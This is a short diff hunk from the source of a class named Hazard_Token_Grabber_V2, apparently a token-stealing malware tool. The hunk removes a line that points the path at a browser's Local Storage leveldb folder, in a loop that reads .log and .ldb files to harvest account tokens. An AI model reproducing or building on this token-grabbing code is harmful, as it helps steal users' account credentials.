@@ -311,7 +311,6 @@ class Hazard_Token_Grabber_V2:
                                     self.tokens.append(token)
             else:
                 r = "dQw4w9WgXcQ"
-                path += "\\Local Storage\\leveldb"
                 for file_name in os.listdir(path):
                     if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                         continue
